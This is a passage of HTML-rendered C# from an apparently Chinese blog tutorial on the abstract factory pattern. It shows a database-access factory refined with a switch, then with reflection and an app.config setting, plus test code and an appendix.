keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>抽象产品</strong>：</p><p><strong>IUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>IDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体产品</strong>：</p><p><strong>SqlserverUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>AccessUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>SqlserverDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>AccessDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>工厂类</strong>：</p><p><strong>DataAccess类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//private static readonly string db = "Access";</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IUser result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>db<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"Access"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IDepartment result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>db<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"Access"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用简单工厂来改进抽象工厂测试结果.png" alt="用简单工厂来改进抽象工厂测试结果"></center><p><strong>注</strong>：</p><ul><li>客户端完全不知道后端使用的数据库接口</li><li>但当增加数据库接口时，就需要在DataAccess类中修改每个方法</li></ul><h2 id="绝佳改进方案"><a href="#绝佳改进方案" class="headerlink" title="绝佳改进方案"></a>绝佳改进方案</h2><p>​        使用简单工厂改进的抽象工厂中，引入switch导致程序耦合，添加后修改程序时需要修改一连串的类，通过某种方式避免这种耦合就可以达到绝佳的改进效果。下面引入：<strong>反射 + 配置文件 + 抽象工厂</strong></p><p><strong>实体类</strong>：（User 、 Department）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试基类</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>抽象产品</strong>：（IUser、IDepartment）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> User类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Department类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品</strong>：（SqlserverUser、AccessUser、SqlserverDepartment、AccessDepartment）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverUser类在SQL Server中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessUser类在Access中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverDepartment类在SQL Server中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessDepartment类在Access中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>工厂类</strong>：（DataAccess）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 使用反射创建操作数据的接口</span>    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//程序集名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> AssemblyName <span class="token operator">=</span> <span class="token string">"抽象工厂模式"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置文件中链接的数据名称</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> ConfigurationManager<span class="token punctuation">.</span>AppSettings<span class="token punctuation">[</span><span class="token string">"DB"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"User"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用发射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IUser<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">string</span> className <span class="token operator">=</span> AssemblyName <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> db <span class="token operator">+</span> <span class="token string">"Department"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//使用反射创建指定类的实例</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>IDepartment<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span>AssemblyName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>app.config</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>configuration<span class="token operator">></span>    <span class="token operator">&lt;</span>appSettings<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token keyword">add</span> key<span class="token operator">=</span><span class="token string">"DB"</span> <span class="token keyword">value</span><span class="token operator">=</span><span class="token string">"Sqlserver"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>appSettings<span class="token operator">></span><span class="token operator">&lt;</span>startup<span class="token operator">></span><span class="token operator">&lt;</span>supportedRuntime version<span class="token operator">=</span><span class="token string">"v4.0"</span> sku<span class="token operator">=</span><span class="token string">".NETFramework,Version=v4.6.1"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>startup<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>configuration<span class="token operator">></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化对象</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IUser对象，对User执行相关操作</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IDepartment对象，对Department执行相关操作</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>using System.Reflection;                        //使用反射必须要引入的命名空间</li><li>using System.Configuration;                     //拿到配置文件中的字符变量必须要引入的命名空间</li><li>客户端与后端完全解耦</li><li>其他类与工厂类解耦</li><li>添加商品时，只要按模板添加商品类，修改工厂类中的方法即可</li><li>切换数据库接口时，只需修改app.config配置文件即可</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>反射 + 配置文件 + 抽象工厂</strong>完整代码：</p><p><strong>Program.cs</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/******************************************************** * 设计模式：抽象工厂模式，（反射+配置文件+抽象工厂） *  * 反射： *       return (IUser)Assembly.Load(AssemblyName).CreateInstance(className); *       AssemblyName：为本程序集名称 *       className：为程序集中要实例化的类的名称（完整路径） *       (IUser)：将创建的对象强制转化为IUser对象 *  * 配置文件信息： *       使用&lt;appStrings>节点来设置链接的数据库名称 *  */</span><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//使用反射必须要引入的命名空间</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">//拿到配置文件中的字符变量必须要引入的命名空间</span><span class="token keyword">namespace</span> 抽象工厂模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化对象</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IUser对象，对User执行相关操作</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//创建IDepartment对象，对Department执行相关操作</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token 